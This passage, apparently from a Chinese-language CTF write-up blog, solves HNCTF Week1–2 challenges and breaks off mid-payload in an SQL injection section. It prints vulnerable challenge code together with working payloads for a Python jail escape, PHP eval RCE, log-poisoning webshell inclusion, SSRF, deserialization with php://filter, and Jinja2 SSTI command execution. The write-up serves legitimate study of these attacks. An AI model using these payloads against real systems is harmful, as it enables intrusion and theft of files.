class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _     ______      _                              _       _ _ </span><br><span class="hljs-string"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="hljs-string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="hljs-string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="hljs-string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="hljs-string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="hljs-string">               __/ |                                           </span><br><span class="hljs-string">              |___/                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>nc连接靶机</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102159399.png" alt="image-20221010203748977"></p><p>无过滤</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>用 <strong>import</strong> 这个内置方法，通过这个方法导入 os 模块，然后再用 os 模块调用 system 方法</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200818.png" alt="image-20221010215123218"></p><h2 id="Week1-python2-input-JAIL"><a href="#Week1-python2-input-JAIL" class="headerlink" title="[Week1]python2 input(JAIL)"></a>[Week1]python2 input(JAIL)</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(&#x27;./flag&#x27;)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200586.png" alt="image-20221003200815680"></p><h2 id="Week1-Challenge-rce"><a href="#Week1-Challenge-rce" class="headerlink" title="[Week1]Challenge__rce"></a>[Week1]Challenge__rce</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span>灵感来源于ctfshow吃瓜杯Y4大佬的题<br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rce&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rce</span>) &lt;= <span class="hljs-number">130</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$rce</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Are you hack me?&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I want string!&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;too long!&quot;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>自增rce，网上的帖子很多，大多都是转载P神的。</p><p>没啥新东西，挺狗的（bushi），就是死命压缩代码量。</p><p>思路就是拼接出chr，用chr直接构造字符，其实一开始思路就对了，但是代码那会儿才压缩到一百五，还以为思路错了。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[]._;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">1</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_1</span>=++<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_1</span>.++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$_</span>(<span class="hljs-number">71</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">69</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">84</span>);(<span class="hljs-variable">$$_</span>&#123;<span class="hljs-number">1</span>&#125;)(<span class="hljs-variable">$$_</span>&#123;<span class="hljs-number">2</span>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200208.png" alt="image-20221010201512706"></p><p>正好一百二，极限。</p><h2 id="WEEK2-easy-include"><a href="#WEEK2-easy-include" class="headerlink" title="[WEEK2]easy_include"></a>[WEEK2]easy_include</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//WEB手要懂得搜索</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>php都过滤了，用日志包含，nginx的服务器</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200110.png" alt="image-20221010202430002"></p><p>在UA头写马就行了</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201548.png" alt="image-20221010203000668"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200499.png" alt="image-20221010203009821"></p><h2 id="WEEK2-ez-ssrf"><a href="#WEEK2-ez-ssrf" class="headerlink" title="[WEEK2]ez_ssrf"></a>[WEEK2]ez_ssrf</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>),<span class="hljs-variable">$error</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$data</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">🥰localhost plz🥰<br></code></pre></td></tr></table></figure><p>一开始没打过这种fsockopen()的SSRF，以为fwrite可以用来直接写webshell   &lt;(￣3￣)&gt; </p><p>但是其实是向打开的连接通道发送信息的（不是直接向主机发送）</p><p>因此可以构造</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> HOST:<span class="hljs-number">127.0.0.1</span> Connection:Close<br></code></pre></td></tr></table></figure><p>我是用代码拼接的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$out</span>  = <span class="hljs-string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;HOST:127.0.0.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection:Close\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br></code></pre></td></tr></table></figure><p>因为\r\n这样的换行符直接用编码工具不管用</p><p>这是失败的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMSBIT1</span><span class="hljs-symbol">NUOjEyNy4</span>wLjAuMSBDb<span class="hljs-number">25</span>uZW<span class="hljs-symbol">N0</span>aW<span class="hljs-number">9</span>uOk<span class="hljs-symbol">Nsb3</span><span class="hljs-symbol">Nl</span><br></code></pre></td></tr></table></figure><p>成功payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMQ0</span>KSE<span class="hljs-number">9</span>TVDoxMjcuMC<span class="hljs-number">4</span>wLjE<span class="hljs-symbol">NCkNvbm5</span>lY<span class="hljs-number">3</span>Rpb<span class="hljs-number">246</span>Q<span class="hljs-number">2</span>x<span class="hljs-attr">vc2</span>U<span class="hljs-symbol">NCg0</span>KDQo=<br></code></pre></td></tr></table></figure><p>完整payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?host=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;port=<span class="hljs-number">80</span>&amp;data=R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMQ0</span>KSE<span class="hljs-number">9</span>TVDoxMjcuMC<span class="hljs-number">4</span>wLjE<span class="hljs-symbol">NCkNvbm5</span>lY<span class="hljs-number">3</span>Rpb<span class="hljs-number">246</span>Q<span class="hljs-number">2</span>x<span class="hljs-attr">vc2</span>U<span class="hljs-symbol">NCg0</span>KDQo=<br></code></pre></td></tr></table></figure><p>等待时间比较久，是正常现象。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200269.png" alt="image-20221005234117645"></p><h2 id="WEEK2-Canyource"><a href="#WEEK2-Canyource" class="headerlink" title="[WEEK2]Canyource"></a>[WEEK2]Canyource</h2><p>经典无参数RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;please input code&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获取当前目录文件名</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?code=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200862.png" alt="image-20221005234610920"></p><p>读取flag</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?code=readfile(next(<span class="hljs-built_in">array</span><span class="hljs-constructor">_reverse(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200221.png" alt="image-20221005235138147"></p><h2 id="WEEK2-easy-unser"><a href="#WEEK2-easy-unser" class="headerlink" title="[WEEK2]easy_unser"></a>[WEEK2]easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">body</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$want</span>,<span class="hljs-variable">$todonothing</span> = <span class="hljs-string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$want</span></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is created,I will be called&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$want</span> !== <span class="hljs-string">&quot; &quot;</span>) <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable">$want</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable language_">$this</span>-&gt;todonothing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is unserialized,I will be called&quot;</span>;<br>        <span class="hljs-variable">$but</span> = <span class="hljs-string">&quot;I can CHANGE you&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt; want = <span class="hljs-variable">$but</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C1ybaby!&quot;</span>;<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;So,let me see if you can get what you want\n&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;todonothing === <span class="hljs-variable language_">$this</span>-&gt;want)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鲍勃,别傻愣着!\n&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;want == <span class="hljs-string">&quot;I can CHANGE you&quot;</span>)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are not you....&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;want == <span class="hljs-string">&quot;f14g.php&quot;</span> OR <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;want))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You want my heart?No way!\n&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You got it!&quot;</span>;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;want);<br>            &#125;<br>    &#125;<br>&#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unserializeorder</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$CORE</span> = <span class="hljs-string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is serialized,I will be called&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is used as a string,I will be called&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;CORE;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">unserializeorder</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br>    <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ywant&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-variable">$ywant</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ywant&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ywant</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>就两个类 body 和unserializeorder</p><p>明显是用作入门，unserializeorder没有用，不是pop链。</p><p>需要绕过wakeup，hightlight_file可以触发伪协议，使用伪协议读取flag</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">body</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$want</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$want</span></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is created,I will be called&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$want</span> !== <span class="hljs-string">&quot; &quot;</span>) <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable">$want</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable language_">$this</span>-&gt;todonothing;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">body</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200466.png" alt="image-20221006001515137"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGZsYWcgPSAiTlNTQ1RGe2JjYzFiNGYwLTJjYmItNDEyYy04YzUyLWVlODQwMGZiZDk0Nn0iOwo/Pg==<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;NSSCTF&#123;bcc1b4f0-2cbb-412c-8c52-ee8400fbd946&#125;&quot;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="WEEK2-ez-SSTI"><a href="#WEEK2-ez-SSTI" class="headerlink" title="[WEEK2]ez_SSTI"></a>[WEEK2]ez_SSTI</h2><p>无过滤SSTI直接打</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200481.png" alt="image-20221005235628951"></p><h2 id="WEEK2-easy-sql"><a href="#WEEK2-easy-sql" class="headerlink" title="[WEEK2]easy_sql"></a>[WEEK2]easy_sql</h2><p>三种回显</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Here <span class="hljs-keyword">is</span> your want!<br>I <span class="hljs-keyword">am</span> <span class="hljs-keyword">so</span> handsome <br><br>姓名不存在，或账号密码错误<br><br>error<br></code></pre></td></tr></table></figure><p>error应该是黑名单检测。</p><p>万能密码成功执行，闭合完成</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">id</span>=<span class="hljs-number">11</span><span class="hljs-string">&#x27;/**/or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span 